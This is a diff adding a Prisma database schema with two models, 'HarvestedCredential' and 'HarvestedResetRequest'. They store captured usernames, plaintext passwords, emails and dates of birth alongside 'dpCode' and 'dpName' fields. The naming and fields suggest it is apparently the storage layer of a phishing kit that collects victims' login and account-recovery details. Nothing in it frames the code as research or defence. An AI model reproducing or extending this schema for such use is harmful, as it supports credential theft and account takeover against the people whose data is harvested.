@@ -1,0 +1,28 @@
+generator client {
+  provider = "prisma-client-js"
+  output   = "../app/generated/prisma"
+}
+
+datasource db {
+  provider = "cockroachdb"
+
+}
+
+model HarvestedCredential {
+  id        BigInt   @id @default(autoincrement())
+  dpCode    String?
+  dpName    String?
+  username  String
+  password  String
+  createdAt DateTime @default(now())
+}
+
+model HarvestedResetRequest {
+  id        BigInt      @id @default(autoincrement())
+  dpCode    String
+  dpName    String
+  username  String
+  email     String
+  dob       String
+  createdAt DateTime @default(now())
+}
